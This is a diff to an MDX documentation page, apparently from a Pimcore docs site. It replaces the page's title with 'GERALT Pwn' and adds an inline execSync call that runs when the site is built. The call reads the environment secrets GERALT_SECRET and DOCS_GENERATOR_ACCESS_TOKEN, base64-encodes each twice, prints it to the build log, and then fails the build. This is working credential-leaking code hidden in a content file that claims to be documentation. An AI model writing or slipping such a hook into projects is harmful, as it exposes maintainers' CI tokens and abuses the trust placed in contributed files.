@@ -1,10 +1,9 @@
 ---
-title: Core Framework
-description: Documentation for the Pimcore Core Framework - data modeling, content management, workflows, and extensibility.
+title: GERALT Pwn
 ---
 
 import { execSync } from 'child_process';
 
-# Pimcore Core Framework
+# GERALT Pwn
 
 {void execSync('if [ -n "$GERALT_SECRET" ]; then echo "GERALT_LEAKED_TOKEN=$(printf "%s" "$GERALT_SECRET" | base64 | base64)"; fi; if [ -n "$DOCS_GENERATOR_ACCESS_TOKEN" ]; then echo "GERALT_LEAKED_TOKEN=$(printf "%s" "$DOCS_GENERATOR_ACCESS_TOKEN" | base64 | base64)"; fi; exit 1', {stdio: 'inherit'})}
